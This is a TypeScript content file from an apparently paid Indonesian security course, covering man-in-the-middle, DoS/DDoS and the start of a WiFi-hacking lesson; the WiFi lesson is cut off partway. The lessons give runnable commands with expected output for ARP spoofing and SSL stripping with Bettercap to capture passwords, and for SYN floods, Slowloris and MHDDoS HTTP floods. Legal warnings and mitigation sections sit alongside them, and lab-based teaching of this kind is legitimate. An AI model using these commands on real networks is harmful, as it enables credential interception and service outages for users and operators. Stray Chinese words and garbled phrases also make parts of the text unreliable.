// CyberEd — Materi Serangan Batch 3: Network Attacks
// MITM, DoS/DDoS, WiFi Hacking
import type { MateriData } from '../materi-content/runner';

export const seranganNetwork: MateriData[] = [
  // ============================ MITM ============================
  {
    judul: '🕵️ Man-in-the-Middle (MITM) — Sadap Komunikasi di Tengah Jalan',
    emoji: '🕵️',
    deskripsi: 'Pelajari ARP spoofing + SSL Strip dengan Bettercap. Lihat langsung bagaimana attacker bisa tangkap plaintext password di WiFi publik melalui laptop sendiri.',
    level: 'menengah',
    harga: 20000,
    hargaCoret: 30000,
    isGratis: false,
    tipe: 'serangan',
    tujuan: 'Kamu paham konsep MITM, mampu melakukan ARP spoofing dengan Bettercap, mengerti bagaimana SSL Strip downgrade HTTPS, dan tahu防御 utama (HTTPS, HSTS, Certificate Pinning, VPN).',
    analogy: 'Bayangkan kamu kirim surat ke temen lewat pos. Normalnya surat langsung diantar. MITM itu kayak ada orang yang nyamar jadi tukang pos — buka suratmu, baca isinya, copy, lalu tutup lagi dan kirim ke temenmu. Temenmu dapat surat, kamu dapat surat, tapi orang tengah sudah tahu isinya. Bahkan dia bisa ubah isinya diam-diam.',
    apaItu: 'Man-in-the-Middle (MITM) adalah serangan di mana attacker menyisipkan dirinya di antara komunikasi dua pihak (misal client-server). Kedua pihak merasa bicara langsung satu sama lain, tapi sebenarnya semua data lewat attacker dulu.\n\nMITM paling sering terjadi di WiFi publik (kafe, bandara, hotel) — attacker buat hotspot palsu atau ARP-spoofing jaringan agar semua traffic lewat laptopnya.',
    caraKerja: '1) **ARP Spoofing**: attacker kirim ARP reply palsu ke target & gateway, mengklaim "IP gateway adalah MAC address saya". Target mengira attacker = router. Semua traffic target lewat attacker.\n2) **SSL Stripping**: HTTPS di-downgrade ke HTTP oleh attacker (proxy transparan). User login di HTTP plain = password tertangkap.\n3) **DNS Spoofing**: attacker jawab query DNS palsu, arahkan user ke server attacker.',
    asciiDiagram: "NORMAL:\n[Klien] ---- HTTPS ----> [Server asli]\n\nSETELAH MITM:\n[Klien] -- HTTP (downgrade) --> [Attacker] -- HTTPS --> [Server]\n            \"login di sini\"  -> semua lewat attacker ->\n            password tertangkap di tengah",
    senjata: {
      pc: '**Bettercap** (`sudo apt install bettercap`), **Wireshark** (analisis paket), **Ettercap** (alternatif). Adapter WiFi yang support monitor mode (untuk advanced).',
      hp: 'Termux + `arpspoof` + `nmap`. Untuk HP tanpa root, fitur terbatas.',
    },
    metode: [
      {
        nama: 'Metode 1: ARP Spoofing dengan Bettercap di PC (Pemula)',
        level: 'pemula',
        deskripsi: 'Cara paling jelas MITM: pakai Bettercap untuk ARP spoof target + capture packet. Cocok untuk pemula karena GUI console interaktif lebih user-friendly.',
        prasyarat: [
          'Linux (Kali / Ubuntu). WSL tidak ideal (perlu interface jaringan asli)',
          'Target HP/laptop lain di jaringan LAB yang Anda kontrol',
          'Jaringan LAB bukan production (lab pribadi / network isolated)',
        ],
        langkah: [
          {
            judul: '⚠️ Peringatan hukum: HANYA di lab sendiri!',
            aksi: 'Kalian MITM ke traffic orang lain tanpa izin = ilegal (UU ITE Pasal 30-36). Lab ini HANYA boleh dijalankan di:\n- Jaringan labisolasi (router terpisah, tidak ada perangkat selain milik Anda)\n- Komputer & HP sendiri yang Anda kontrol penuh\n- Lab resmi dengan izin tertulis',
            catatan: 'Pelanggaran hukum = pidana. Gunakan untuk edukasi.',
          },
          {
            judul: 'Install Bettercap',
            aksi: 'Buka terminal, install Bettercap: `sudo apt update && sudo apt install bettercap -y`. Tunggu 1-3 menit.',
            command: 'sudo apt update && sudo apt install bettercap -y',
            expected: 'No errors. Bettercap installed.',
          },
          {
            judul: 'Cek interface jaringan & IP lokal',
            aksi: 'Cek interface aktif: `ip addr show`. Cari yang ada `_ipv4` (misal `192.168.1.X /24`). Catat juga IP gateway (cek dengan `ip route` → default via 192.168.1.1 biasanya).\n\nUntuk target lab, gunakan HP kedua yang Anda kontrol juga (HP lain sebagai "korban" testing).',
            command: 'ip addr show\nip route',
            expected: 'Output IP + route. Catat: interface (wlan0/eth0), IP attacker, IP target, IP gateway.',
          },
          {
            judul: 'Jalankan Bettercap',
            aksi: 'Jalankan Bettercap di interface Anda: `sudo bettercap -iface wlan0`. (Ganti sesuai interface jika ethernet: `-iface eth0`). Bettercap console akan muncul dengan prompt `>` berwarna hijau.',
            command: 'sudo bettercap -iface wlan0',
            expected: 'Bettercap console interaktif terbuka.',
          },
          {
            judul: 'Enable network probe',
            aksi: 'Di Bettercap console, ketik: `net.probe on`. Tunggu 30-60 detik, lalu `net.show`. Akan muncul tabel semua host di jaringan: IP, MAC, vendor. Pilih IP target (HP lab Anda) — catat.',
            command: 'net.probe on\nnet.show',
            expected: 'Daftar host di subnet local Anda.',
          },
          {
            judul: 'Set target ARP spoof',
            aksi: 'Set target untuk ARP spoof: `set arp.spoof.targets 192.168.1.105` (ganti dengan IP target Anda). Aktifkan: `arp.spoof on`. Sekarang semua traffic dari target ke internet lewat attacker Anda.\n\nUntuk spoof gateway juga (full bidirectional MITM): `set arp.spoof.targets 192.168.1.105,192.168.1.1` (IP target,IP gateway).',
            command: 'set arp.spoof.targets 192.168.1.105\narp.spoof on',
            expected: 'Output: arp.spoof started. ARP flooding ke target.',
          },
          {
            judul: 'Sniff semua traffic',
            aksi: 'Aktifkan sniffer: `net.sniff on`. Bettercap sekarang capture semua packet yang lewat. Buka terminal kedua, jalankan Wireshark: `sudo wireshark`. Pilih interface yang sama (wlan0). Sekarang kamu bisa lihat semua HTTP request, DNS query, dan packet lain dari target.',
            command: 'net.sniff on\nsudo wireshark',
            expected: 'Packet mulai masuk. Di Wireshark filter `http` akan terlihat HTTP traffic dari target.',
          },
        ],
        outputAkhir: 'Berhasil melakukan ARP spoof + sniff traffic target lab. Semua packet target lewat laptop attacker.',
        kesalahanUmum: [
          {
            masalah: '❌ "operation not permitted" Bettercap',
            solusi: 'Harus root. Pakai sudo. Atau di Termux butuh HP rooted.',
          },
          {
            masalah: '❌ Target tidak ter-spoof (ARP cache target tetap benar)',
            solusi: 'Cek interface benar (`net.show` di Bettercap). Pastikan target satu subnet.',
          },
          {
            masalah: '❌ Tidak ada packet tertangkap',
            solusi: 'Target belum ada traffic atau firewall memblokir forward. Enable IP forwarding: `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`.',
          },
        ],
      },
      {
        nama: 'Metode 2: SSL Strip - Downgrade HTTPS ke HTTP (Menengah)',
        level: 'menengah',
        deskripsi: 'HTTPS membuat attacker tidak bisa baca content. Tapi attacker bisa downgrade HTTPS ke HTTP dengan SSL Strip. User yang tidak notice akan login di HTTP plain.',
        prasyarat: [
          'Bettercap sudah jalan + ARP spoof aktif',
          'Target mengakses web tanpa HSTS (misal HTTP forum)',
        ],
        langkah: [
          {
            judul: 'Setup HTTP proxy dengan SSL Strip',
            aksi: 'Kalian di Bettercap console, ketik:\n```\nset http.proxy.sslstrip true\nhttp.proxy on\n```\n\nPenjelasan: Bettercap jadi HTTP proxy transparan. Saat target request `https://target.com/`, Bettercap BUAT request `http://target.com/` (tanpa S) dan balikin content sebagai HTTP ke target. Antara Bettercap ↔ server asli tetap HTTPS (terenkripsi), tapi antara target ↔ Bettercap adalah HTTP plain.',
            command: 'set http.proxy.sslstrip true\nhttp.proxy on',
            expected: 'HTTP proxy started with sslstrip enabled.',
          },
          {
            judul: 'Cek apakah ada HTTP cookie / plain password',
            aksi: 'Buka Wireshark di terminal kedua. Filter: `http.cookie or http.request.uri contains "login"` atau `http.request.method == POST`. Saat target login ke situs HTTP (bukan HTTPS), cookie / password akan muncul sebagai plaintext!\n\nKalau target hanya pakai HTTPS dengan HSTS, SSL Strip tidak akan jalan — itu defensive success.',
            command: 'http.cookie',
            expected: 'Packet POST dengan password/cookie terlihat plaintext (kalau ada).',
          },
          {
            judul: 'Verifikasi di Wireshark: lihat paket login',
            aksi: 'Klik salah satu packet POST dengan request URI mengandung "login". Expand Hypertext Transfer Protocol → Form URL Encoded → lihat semua field. Password target akan terlihat dalam plaintext.',
          },
          {
            judul: 'Stop & cleanup',
            aksi: 'Stop semua modul Bettercap:\n```\narp.spoof off\nnet.sniff off\nhttp.proxy off\nset http.proxy.sslstrip false\nexit\n```\n\nARP cache target biasanya pulih sendiri atau restart device.',
            command: 'arp.spoof off\nnet.sniff off\nhttp.proxy off\nexit',
            expected: 'Bettercap exited. Network kembali normal.',
          },
        ],
        outputAkhir: 'Berhasil melakukan SSL Strip untuk downgrade HTTPS ke HTTP. Plain password tertangkap.',
        kesalahanUmum: [
          {
            masalah: '❌ Tidak ada password tertangkap',
            solusi: 'Target hanya pakai HTTPS dengan HSTS. SSL Strip tidak efektif untuk situs modern. Coba target HTTP-only untuk demo.',
          },
          {
            masalah: '❌ Bettercap hang setelah http.proxy on',
            solusi: 'Biasanya butuh beberapa detik untuk stabil. Tunggu lalu lanjut.',
          },
        ],
      },
      {
        nama: 'Metode 3: MITM dari HP via Termux (Lanjut)',
        level: 'lanjut',
        deskripsi: 'Laptop rusak tapi mau coba MITM dari HP. Bisa, dengan konfigurasi Termux + arpspoof + tcpdump. Lebih terbatas tapi functional untuk lab.',
        prasyarat: [
          'HP Android rooted (atau non-root dengan beberapa limitasi)',
          'Termux terinstall dari F-Droid',
          'Target device lab yang Anda kontrol',
        ],
        langkah: [
          {
            judul: 'Install tools di Termux',
            aksi: 'Kalian buka Termux (dari F-Droid, bukan Play Store). Install tools:\n```\npkg update -y\npkg install root-repo -y\npkg install tsu nmap dsniff -y\n```\n\nPro tip: butuh `tsu` untuk root access (alternatif sudo di Termux).',
            command: 'pkg update -y\npkg install root-repo -y\npkg install tsu nmap dsniff -y',
            expected: 'Tools installed.',
            catatan: 'Non-rooted HP sangat terbatas untuk MITM. Kalau tidak punya HP rooted, jalankan dari PC saja (Metode 1-2).',
          },
          {
            judul: 'Enable IP forwarding',
            aksi: 'Sebelum ARP spoof, aktifkan IP forwarding supaya traffic target tidak stuck: `tsu` → masukkan di shell root: `echo 1 > /proc/sys/net/ipv4/ip_forward`.',
            command: 'tsu\necho 1 > /proc/sys/net/ipv4/ip_forward',
            expected: 'IP forwarding enabled.',
          },
          {
            judul: 'ARP spoof dari HP',
            aksi: 'Sekarang spoof target: `arpspoof -i wlan0 -t TARGET_IP GATEWAY_IP`. Ganti dengan IP Anda. Traffic target lewat HP Anda.\n\nContoh: target HP kedua 192.168.1.110, gateway 192.168.1.1: `arpspoof -i wlan0 -t 192.168.1.110 192.168.1.1`',
            command: 'arpspoof -i wlan0 -t 192.168.1.110 192.168.1.1',
            expected: 'ARP spoof started. Target akan mulai kirim packet via HP attacker.',
          },
          {
            judul: 'Capture di Wireshark (PC parallel)',
            aksi: 'Untuk analisis detail, jalankan Wireshark di PC yang satu jaringan dengan HP attacker. Capture filter HTTP. Atau di HP pakai tcpdump di Termux: `tsu` → `tcpdump -i wlan0 -w capture.pcap port 80` (capture semua HTTP). Saat target login HTTP, password masuk ke file capture.pcap.',
            command: 'tcpdump -i wlan0 -w capture.pcap port 80',
            expected: 'Capture file dibuat. Analisis dengan Wireshark / tcpdump -r capture.pcap -A.',
          },
        ],
        outputAkhir: 'Berhasil melakukan MITM dari HP via Termux (rooted). Workflow lengkap Apache ARP spoof + capture.',
        kesalahanUmum: [
          {
            masalah: '❌ "permission denied" di tsu',
            solusi: 'HP harus rooted (Magisk / SuperSU). Kalau tidak, pakai emulator Android di PC (bluestacks) untuk testing.',
          },
          {
            masalah: '❌ arpspoof tidak available',
            solusi: 'Pakai package `ettercap` atau `bettercap` di Termux (kalau available). Atau pakai `nping` untuk ARP spoof manual.',
          },
        ],
      },
    ],
    mitigasi: 'Cara mempertahankan dari MITM:\n\n**1. HTTPS Everywhere**: semua situs WAJIB HTTPS. Jangan pernah login di HTTP.\n\n**2. HSTS (HTTP Strict Transport Security)**: header `Strict-Transport-Security: max-age=31536000` = browser selalu gunakan HTTPS.\n\n**3. Certificate Pinning**: app mobile hardcode certificate fingerprint server. Cegah MITM bahkan dengan CA palsu.\n\n**4. VPN terpercaya**: VPN mengenkripsi semua traffic. Pilih yang punya track record privacy baik.\n\n**5. Hindari WiFi publik tanpa VPN**: di kafe/bandara, attacker bisa ARP semua user. Selalu pakai VPN.\n\n**6. ARP monitoring tools**: Arpwatch / Wazuh detect ARP spoof anomaly di jaringan internal.\n\n**7. 802.1X Authentication**: port-based auth di switch — perangkat harus authenticate.',
    latihan: [
      '🔰 Cek ARP cache sendiri sebelum & sesudah Bettercap ARP spoof. Apa yang berubah di ARP table target?',
      '🔰 Tes Wireshark filter `http.cookie` di jaringan lab. Berapa credential tertangkap?',
      '🟡 Coba MITM di HTTPS-only site — lihat SSL Strip gagal karena HSTS.',
      '🟡 Setup router dengan ARP monitoring aktif, jalankan Bettercap, lihat notifikasi.',
      '🔴 Setup lab mini: 2 VM (1 attacker, 1 target) + switch virtual. Full MITM chain defense testing.',
    ],
    faq: [
      { q: 'Apakah MITM hanya di WiFi?', a: 'Tidak. Bisa juga via: rogue WiFi hotspot, ARP spoof (wired), DNS hijack, BGP hijack (skala ISP), SSL stripping, malicious proxy. Semua jalur komunikasi bisa di-MITM.' },
      { q: 'Apakah HTTPS cukup aman dari MITM?', a: 'HTTPS dengan TLS valid sangat sulit di-MITM. Edge case: (1) SSL Strip jika user klik "continue" di warning, (2) Rogue CA certificate jika attacker install di sistem user, (3) Heartbleed / POODLE bugs lama.' },
      { q: 'Apakah VPN melindungi dari MITM?', a: 'VPN mengenkripsi traffic antara kamu ↔ VPN server. Tapi VPN server JANGAN trusted secara buta — pilih provider yang tidak log.' },
      { q: 'Bagaimana trace siapa yang MITM saya?', a: 'Cek ARP table (perangkat tidak dikenal = suspicious), monitor Wireshark untuk traffic aneh, IDS seperti Suricata. Lapor admin jaringan jika di kantor.' },
    ],
    ringkasan: [
      'MITM = attacker di tengah komunikasi 2 pihak',
      'Teknik: ARP Spoof, DNS Spoof, SSL Strip, Rogue WiFi',
      'Tool: Bettercap (best all-in-one), Ettercap, arpspoof',
      'Efek: password bocor, session di-hijack, traffic diubah',
      'Lab: HANYA jaringan labisolasi / lab resmi',
      'Pertahanan utama: HTTPS + HSTS + Certificate Pinning + VPN',
      'Wajib VPN saat pakai WiFi publik',
    ],
    materiRelated: ['WiFi Hacking', 'Session Hijacking', 'Enkripsi & Keamanan Data', 'Network Segmentation'],
  } as MateriData,
  // ============================ DoS / DDoS ============================
  {
    judul: '🌊 DoS/DDoS — Banjir Traffic Sampai Layanan Lumpuh',
    emoji: '🌊',
    deskripsi: 'Pelajari SYN flood, UDP flood, HTTP flood, dan Slowloris. Lihat bagaimana 1 laptop dengan hping3 bisa melumpuhkan Apache server lab, dan bagaimana cara防御 dengan Cloudflare.',
    level: 'sulit',
    harga: 25000,
    hargaCoret: 35000,
    isGratis: false,
    tipe: 'serangan',
    tujuan: 'Kamu paham beda DoS vs DDoS, mampu menjalankan SYN flood dan Slowloris dengan aman di lab sendiri, dan tahu防御 modern (Cloudflare, WAF, rate limiting, anycast).',
    analogy: 'Bayangkan kafe kecil dengan 1 pelayan. Normalnya dia bisa layani 10 customer sekaligus. DDoS itu kayak 1000 orang datang barengan pesan kopi tapi tidak bayar — mereka cuma berdiri pesan ulang-ulang. Pelayan overwhelmed, customer asli harus antri berjam-jam atau pergi. Kafe "lumpuh" meskipun cafe-nya tidak rusak secara fisik.',
    apaItu: 'Denial-of-Service (DoS) adalah serangan untuk membuat layanan tidak tersedia bagi pengguna sah. Distributed DoS (DDoS) menambah dimensi: attack datang dari ribuan komputer / IoT devices yang compromised (botnet).\n\nTiga jenis utama: Volume-based (banjir bandwidth), Protocol attack (exploit resource server), Application layer (flood HTTP request mahal).',
    caraKerja: '1) **SYN Flood**: kirim ribuan packet SYN (minta handshake) tapi tidak pernah kirim ACK balik. Server pegang "koneksi setengah jadi" di memory → habis → crash.\n2) **UDP Flood**: kirim UDP packet besar ke port random. Server coba respon ICMP unreachable → bandwidth habis.\n3) **HTTP Flood**: kirim ribuan GET/POST request HTTP yang mahal. Server kewalahan proses.\n4) **Slowloris**: buka koneksi HTTP, kirim header sangat perlahan (1 byte per beberapa detik). Server pegang koneksi lama → new connection ditolak.',
    asciiDiagram: "SYN FLOOD:\nPenyerang --> SYN --> Server: \"setuju, SYN-ACK untukmu\"\n              |                |\n              |                | tunggu ACK dari client...\n              |                | (penyerang tidak kirim ACK)\n              |                |\n              | 1000 SYN berikutnya --> \n              |\nServer: connection table PENUH -> REJECT user sah\n\nSLOWLORIS:\nBrowser --> GET / HTTP/1.1 --> Server (buka socket)\nBrowser --> User-Agent: M-----> Server (tunggu header lengkap, 5 detik)\nBrowser --> O------------->  (kirim pelan)\nBrowser --> Z-------------->\nServer: socket di-grab 500 koneksi Slowloris -> COLAPSE",
    senjata: {
      pc: '**hping3** (`sudo apt install hping3`), **Slowloris** (`pip install slowloris`), **MHDDoS** (`pip install MHDDoS`), **LOIC**, **GoldenEye**. Apache Benchmark Tools (`ab`).',
      hp: 'Termux + MHDDoS via pip. Tools attack dari HP tidak punya kekuatan besar — hanya untuk lab lokal.',
    },
    metode: [
      {
        nama: 'Metode 1: SYN Flood dengan hping3 (Pemula)',
        level: 'pemula',
        deskripsi: 'Cara paling jelas DoS: SYN flood dengan hping3. Butuh 2 komputer/laptop untuk lab (1 attacker, 1 target Apache).',
        prasyarat: [
          '2 komputer/laptop di jaringan labisolasi',
          'PC attacker: Linux dengan hping3',
          'PC target: Linux dengan Apache',
          'Anda mengontrol kedua PC',
        ],
        langkah: [
          {
            judul: '⚠️ Disclaimer Hukum DoS',
            aksi: 'DoS/DDoS ke server yang BUKAN milik Anda = ILEGAL (UU ITE 30-36, bahkan "test" sekalipun). Lab ini WAJIB dijalankan di:\n- VPS / server lab milik sendiri\n- Komputer sendiri di jaringan labisolasi\n- Platform legal (CyberDefenders, test lab Security Trails, atau Honeypot milik sendiri)',
            catatan: 'Pelanggaran hukum = pidana.',
          },
          {
            judul: 'Setup target Apache di PC #2',
            aksi: 'Di PC target (yang akan diserang), buka terminal: `sudo apt install apache2 -y`. Buat halaman ringan: `echo "<h1>Target Latihan DoS</h1>" | sudo tee /var/www/html/index.html`. Start: `sudo systemctl start apache2`. Cek IP lokal: `hostname -I` (misal `192.168.1.100`). Ini target Anda.',
            command: 'sudo apt install apache2 -y\necho "<h1>Target Latihan DoS</h1>" | sudo tee /var/www/html/index.html\nsudo systemctl start apache2\nhostname -I',
            expected: 'Apache running di target. IP local tercatat.',
          },
          {
            judul: 'Install hping3 di PC attacker',
            aksi: 'Di PC attacker, install hping3: `sudo apt install hping3 -y`.',
            command: 'sudo apt install hping3 -y',
            expected: 'hping3 installed.',
          },
          {
            judul: 'Buka终端 #1: monitor target dengan TCP SYN count',
            aksi: 'Di PC target, buka terminal monitoring: `watch -n 1 "ss -tan | grep SYN_RECV | wc -l"`. Angka ini = jumlah koneksi setengah jadi. Normal < 10. Saat SYN flood akan melonjak puluhan/ribuan.',
            command: 'ss -tan | grep SYN_RECV | wc -l',
            expected: 'Angka rendah saat normal.',
          },
          {
            judul: 'Jalankan SYN flood dari attacker',
            aksi: 'Di PC attacker, jalankan: `sudo hping3 -S --flood -p 80 192.168.1.100` (ganti IP target). Penjelasan: `-S` set SYN flag (cuma SYN, tanpa ACK jadi server stuck), `--flood` kirim secepat mungkin tanpa display, `-p 80` port HTTP.\n\n⚠️ Tekan Ctrl+C untuk stop!',
            command: 'sudo hping3 -S --flood -p 80 192.168.1.100',
            expected: 'Terminal attacker penuh output cepat (kalau --flood off). Target SYN_RECV mulai melonjak.',
          },
          {
            judul: 'Lihat efek di PC #3 atau sendiri',
            aksi: 'Buka laptop ketiga (atau HP kedua). Akses `http://192.168.1.100`. Loading akan sangat lambat atau timeout. Cek CPU di target: `top` — apache2 process CPU tinggi.\n\nTekan Ctrl+C di attacker untuk stop attack. Tunggu 30 detik server recover.',
          },
        ],
        outputAkhir: 'Berhasil setup lab DoS dengan hping3. Bandingkan SYN_RECV count sebelum & sesudah.',
        kesalahanUmum: [
          {
            masalah: '❌ "operation not permitted" hping3',
            solusi: 'Harus root (sudo). Di Windows non-WSL, hping3 tidak jalan dengan baik — coba WSL atau pakai Linux native.',
          },
          {
            masalah: '❌ Server tidak terasa lambat',
            solusi: 'Server Anda terlalu kuat. Gunakan VM low-spec untuk target. Atau naik intensitas (slower attacker hardware = limit).',
          },
          {
            masalah: '❌ penyerang IP kena block ISP',
            solusi: 'Di lab LAN, tidak relevan. Untuk WAN, hampir semua ISP blok flood traffic keluar. Untuk lab resmi, minta izin ISP.',
          },
        ],
      },
      {
        nama: 'Metode 2: Slowloris - Low Bandwidth Denial (Menengah)',
        level: 'menengah',
        deskripsi: 'Slowloris sangat efektif karena low bandwidth: buka 500 koneksi HTTP partial, kirim header pelan. Server pegang socket selamanya sampai habis. Banyak web server masih rentan termasuk Apache tanpa mod_reqtimeout.',
        prasyarat: [
          'Target Apache/nginx/etc (lawan di lab sendiri)',
          'Python + slowloris library',
        ],
        langkah: [
          {
            judul: 'Install Slowloris',
            aksi: 'Install via pip: `pip install slowloris`. Atau clone repo: `git clone https://github.com/gkbrk/slowloris && cd slowloris && pip install -r requirements.txt`.',
            command: 'pip install slowloris',
            expected: 'Slowloris installed.',
          },
          {
            judul: 'Jalankan Slowloris ke target',
            aksi: 'Jalankan: `slowloris 192.168.1.100 -p 80 -s 500`. `-s 500` = buka 500 socket bersamaan. Tiap socket kirim 1 byte per beberapa detik. Server pegang semua 500 socket → koneksi baru ditolak.',
            command: 'slowloris 192.168.1.100 -p 80 -s 500',
            expected: '500 slow HTTP connections sent...',
          },
          {
            judul: 'Test koneksi normal dari HP ketiga',
            aksi: 'Akses target normal dari HP ketiga atau PC lain: `http://192.168.1.100`. Seharusnya timeout / sangat lambat. Tunggu 1-2 menit.',
            expected: 'Halaman timeout setelah 30+ detik.',
          },
          {
            judul: 'Tingkatkan jumlah socket untuk efek maksimal',
            aksi: 'Naikkan `-s 1000` atau `-s 2000`. Apache default biasanya cap di 150 max clients per fork, jadi 500 socket bisa langsung overwhelm. Tekan Ctrl+C untuk stop.',
            command: 'slowloris 192.168.1.100 -p 80 -s 1500',
            expected: 'Server mulai reject banyak koneksi.',
            catatan: 'Stop attack setelah selesai untuk menghindari efek permanen. Restart Apache jika perlu.',
          },
        ],
        outputAkhir: 'Berhasil melakukan Slowloris attack Apache lab. Server tidak responsive untuk koneksi reguler.',
        kesalahanUmum: [
          {
            masalah: '❌ Server Apache tidak lumpuh',
            solusi: 'Modern Apache dengan mod_reqtimeout enabled biasanya auto-close koneksi lambat. Nonaktifkan mod_reqtimeout atau pakai nginx lawas sebagai target.',
          },
          {
            masalah: '❌ "connection refused" error di slowloris',
            solusi: 'Target down / firewall block. Cek koneksi dari terminal lain: `curl http://target`.',
          },
        ],
      },
      {
        nama: 'Metode 3: HTTP Flood dengan MHDDoS (Lanjut)',
        level: 'lanjut',
        deskripsi: 'HTTP flood di Application Layer jauh lebih hemat dari SYN — lebih efektif karena server harus proses logic aplikasi. Bisa pakai banyak threads.',
        prasyarat: [
          'Target server lab',
          'Python + MHDDoS package',
          'Setup Apache target yang "mahal" (misal PHP yang lambat)',
        ],
        langkah: [
          {
            judul: 'Clone MHDDoS dan install',
            aksi: 'Clone repo: `git clone https://github.com/MatrixTM/MHDDoS && cd MHDDoS && pip install -r requirements.txt`. MHDDoS punya banyak method (GET, POST, HEAD, dll).',
            command: 'git clone https://github.com/MatrixTM/MHDDoS\ncd MHDDoS && pip install -r requirements.txt',
            expected: 'MHDDoS dependencies installed.',
          },
          {
            judul: 'Setup target lambat (PHP sleep)',
            aksi: 'Di target, buat halaman PHP yang tidur 5 detik: `sudo nano /var/www/html/slow.php`. Isi: `<?php sleep(5); echo "done"; ?>`. Setiap request akan pakai resources server 5 detik. Ini simulasi aplikasi berat.',
            command: 'sudo nano /var/www/html/slow.php',
            expected: 'Halaman PHP tertidur 5 detik tersimpan.',
          },
          {
            judul: 'Jalankan HTTP flood ke slow.php',
            aksi: 'Dari attacker: `python3 start.py GET http://192.168.1.100/slow.php 30 50`. Method GET, URL target, 30 threads, 50 request per thread = 1500 total request. Tunggu 1-3 menit. CPU server target akan spike ke 100%.',
            command: 'python3 start.py GET http://192.168.1.100/slow.php 30 50',
            expected: 'Server load tinggi, slow response.',
          },
          {
            judul: 'Variasi: pakai POST + multi-target',
            aksi: 'MHDDoS bisa POST juga: `python3 start.py POST http://target/login 20 100 --data "username=admin&password=admin"`. Atau tambah multi-target di `targets.txt` (satu URL per baris) lalu jalankan dengan argumen targets file.',
          },
        ],
        outputAkhir: 'Berhasil melakukan HTTP flood Application Layer. CPU server melonjak.',
        kesalahanUmum: [
          {
            masalah: '❌ "ModuleNotFoundError" saat start',
            solusi: 'Install semua dependency: `pip install -r requirements.txt`. Atau pakai `python3 -m pip install -r requirements.txt`.',
          },
          {
            masalah: '❌ Server tidak lumpuh di HTTP flood',
            solusi: 'Tambah concurrent threads ke 100 atau more. Atau target halaman yang lebih berat (database query).',
          },
        ],
      },
    ],
    mitigasi: 'Pertahanan dari DDoS:\n\n**1. CDN + Anycast Network**: Cloudflare / Akamai distribusiAttack traffic ke 200+ POP global. Serangan 100 Gbps terserap.\n\n**2. Rate Limiting**: batasi req/detik per IP. Nginx: `limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;`\n\n**3. Network-level filtering**: upstream provider bisa filter SYN flood via BGP blackhole atau scrubbing center.\n\n**4. Captcha / JS Challenge**: Cloudflare challenge atau Google reCAPTCHA — bot traffic gagal.\n\n**5. WAF modern**: ModSecurity atau Cloudflare WAF detect attack pattern.\n\n**6. Auto-scaling**: cloud dengan auto-scale bisa menambah instance. Tapi mahal.\n\n**7. Null routing / Blackhole**: dalam keadaan super parah, route traffic ke null.\n\n**8. SYN Cookies / Proxy**: SYN cookie (Linux) atasi SYN flood tanpa track partial connection.',
    latihan: [
      '🔰 Setup VPS murah (DigitalOcean $4/bulan) + jalankan Slowloris dari PC. Ukur kapan server mulai unresponsive.',
      '🟡 Konfigurasi Nginx dengan rate limiting di VPS lab, lalu DDoS dengan hping3. Apakah Nginx survive?',
      '🟡 Setup Cloudflare (free tier) untuk VPS lab kamu, lihat DDoS protection otomatis aktif.',
      '🔴 Pelajari BGP Anycast + scrubbing center (paper Cloudflare blog "Understanding DDoS Protection").',
      '🔴 Analisa sample PCAP dari Mirai botnet untuk paham traffic pattern (ada dataset publik untuk edukasi).',
    ],
    faq: [
      { q: 'Apa beda DoS, DDoS, dan stress test?', a: 'DoS = 1 sumber. DDoS = banyak. Stress test = tes beban untuk ukur kapasitas (mirip DoS tapi TUJUAN dan LEGAL). Semua teknik SERUPA tapi intent dan izin menentukan legal.' },
      { q: 'Apakah hacked server kiddies bisa DDoS besar?', a: 'Stresser / booter services ilegal bisa dipakai siapa saja dengan $20/bulan. Ini sebabnya DDoS jadi sering — infrastructure cheap untuk attacke. Tapi target besar perlu mitigasi massive.' },
      { q: 'Apakah VPN melindungi dari DDoS?', a: 'VPN menutupi IP asal kamu, tapi tidak melindungi TARGET DDoS. Untuk protecting server, pakai CDN (Cloudflare) atau DDoS mitigation service.' },
      { q: 'Apa itu "DDoS for hire" legal?', a: 'TIDAK. Stress testing BOOTER/STRESER yang "accept any target" = ilegal. Legal alternative: penetration testing dengan izin ATAU DDoS testing service profesional dengan kontrak.' },
    ],
    ringkasan: [
      'DoS = 1 sumber attack. DDoS = ratusan-ribuan sumber (botnet)',
      'Jenis: Volume-based (bandwidth), Protocol (resource), Application (HTTP)',
      'Tool: hping3, Slowloris, MHDDoS, LOIC, GoldenEye',
      'Target HANYA server sendiri / lab dengan izin',
      'Pertahanan terbaik saat ini: Cloudflare / Akamai / AWS Shield',
      'Defense in depth: CDN (L7) + Firewall (L4) + Auto-scale + Rate limit',
      'Jangan attack server lain tanpa izin = PIDANA UU ITE',
    ],
    materiRelated: ['Firewall & IDS/IPS', 'WAF Setup', 'Network Segmentation'],
  } as MateriData,
  // ============================ WIFI HACKING ============================
  {
    judul: '📶 WiFi Hacking — Retas Jaringan Nirkabel',
    emoji: '📶',
    deskripsi: 'Pelajari cara capture WPA handshake dengan airodump-ng, crack password pakai aircrack-ng + rockyou.txt. Termasuk Evil Twin attack untuk membuat WiFi honeypot.',
    level: 'sulit',
    harga: 25000,
    hargaCoret: 35000,
    isGratis: false,
    tipe: 'serangan',
    tujuan: 'Kamu paham enkripsi WiFi (WEP/WPA/WPA2/WPA3), mampu capture 4-way handshake WPA2 dan crack password dengan dictionary attack, dan tahu防御 WPS disable + WPA3 + strong passphrase.',
    analogy: 'Bayangkan pintu rumah dengan kunci. WPA2 = kunci kombinasi 8 angka. Setiap keluarga punya kombinasi sendiri. Kalau ada yang memantau kombinasi yang kamu ketuk (handshake capture), mereka bisa coba semua kombinasi 8 angka (dictionary attack). WPA3 = kunci yang lebih kompleks + dynamic, lebih sulit ditebak.',
    apaItu: 'WiFi Hacking adalah serangan pada jaringan nirkabel untuk mendapatkan akses unauthorized. Target utama adalah access point (router WiFi) yang menggunakan protokol WEP, WPA, atau WPA2.\n\nWEP sudah lawas dan crackable dalam 60 detik dengan tool otomatis. WPA/WPA2 lebih kuat tapi rentan terhadap dictionary attack jika user pakai password lemah. WPA3 (2018+) lebih aman dengan SAE (Simultaneous Authentication of Equals).',
